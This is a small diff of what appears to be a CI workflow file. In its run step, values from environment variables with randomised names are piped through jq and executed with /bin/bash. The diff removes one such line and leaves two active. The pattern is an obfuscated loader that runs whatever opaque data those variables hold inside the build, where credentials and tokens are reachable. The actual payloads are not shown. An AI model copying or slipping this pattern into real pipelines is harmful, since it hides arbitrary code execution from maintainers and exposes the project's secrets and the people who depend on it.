@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$xdg89351" | jq -r .w61 | /bin/bash
           echo $h6 | jq -r .ryms6035 | /bin/bash
-          echo $ox7 | jq -r .mcfhg944 | /bin/bash
 
       - name: Save output
         if: always()
